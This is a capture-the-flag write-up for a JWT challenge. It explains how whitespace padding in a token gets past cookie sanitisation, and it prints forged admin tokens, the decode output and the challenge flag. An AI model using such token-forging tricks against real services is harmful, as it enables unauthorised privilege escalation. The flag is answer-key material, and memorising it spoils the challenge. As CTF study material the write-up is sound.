---
ai_date: 2025-05-17 21:39:04
ai_summary: "JWT token exploitation: Padding with spaces bypassed token validation"
ai_tags:
  - jwt
  - padding
  - xss
created: 2025-05-17T03:31
points: 434
solves: 97
title: JWTF
updated: 2025-05-17T21:52
---

Simple JWT challenge.

```python
session = request.cookies.get('session', None).strip().replace('=', '')
```

I saw this and immediately realized that due to the order, I can just have some token like this:

```
eyJhb--- .eyJhZG1--- .gpX6k---Y73hplA =
```

Where the equals sign is removed only after the `strip`, which means now we have a free space behind the token.

With some local testing it appears that with two spaces the token is valid.

```python
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.1sgMiOBOY0pqObWPICjjEJtuhIVBCyqB2pcCM-key0w  ="
print(jwt.decode(token, APP_SECRET, algorithms=["HS256"]))

{'admin': True, 'uid': '1337'}
```

... but it failed on remote.

I opened a ticket and apparently the author has patched this cheese.

So I looked for another cheese and quickly found another one.

```python
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.  1sgMiOBOY0pqObWPICjjEJtuhIVBCyqB2pcCM-key0w"
print(jwt.decode(token, APP_SECRET, algorithms=["HS256"]))

{'admin': True, 'uid': '1337'}
```

Adding spaces in the middle of the token is not a problem, and it will still decode correctly.

```flag
byuctf{idk_if_this_means_anything_but_maybe_its_useful_somewhere_97ba5a70d94d}
```